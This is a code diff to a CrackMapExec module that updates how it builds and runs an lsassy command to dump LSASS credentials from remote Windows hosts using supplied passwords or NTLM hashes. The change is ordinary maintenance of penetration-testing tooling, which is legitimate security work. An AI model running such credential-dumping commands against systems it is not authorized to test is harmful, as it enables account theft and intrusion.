@@ -85,23 +85,17 @@ class CMEModule:
         nthash = getattr(connection, "nthash", "")
         host = connection.host
 
-        py_arg = "{}/{}:{}@{}".format(
-            domain_name, username, password, host
-        )
-
-        command = r"lsassy -j --hashes {}:{} '{}'".format(
-            lmhash,
-            nthash,
-            py_arg
+        command = r"lsassy --format json -d '{}' -u '{}' -p '{}' -H '{}:{}' {}".format(
+            domain_name, username, password, lmhash, nthash, host
         )
 
         if context.verbose:
-            command += " -d "
+            command += " -vv "
         else:
-            command += " -q "
+            command += " --quiet "
 
         if self.method:
-            command += " -m {}".format(self.method)
+            command += " --method {}".format(self.method)
 
         if self.remote_lsass_dump:
             command += " --dumpname {}".format(self.remote_lsass_dump)
@@ -125,7 +119,7 @@ class CMEModule:
         if code != 0:
             # Debug output
             context.log.error('Error while executing lsassy, try using CrackMapExec with --verbose to get more details')
-            context.log.debug('----- lsassy error -----')
+            context.log.debug('----- lsassy error [{}] -----'.format(code))
             for line in err.split("\n"):
                 context.log.debug('{}'.format(line))
             context.log.debug('-----   end error  -----')
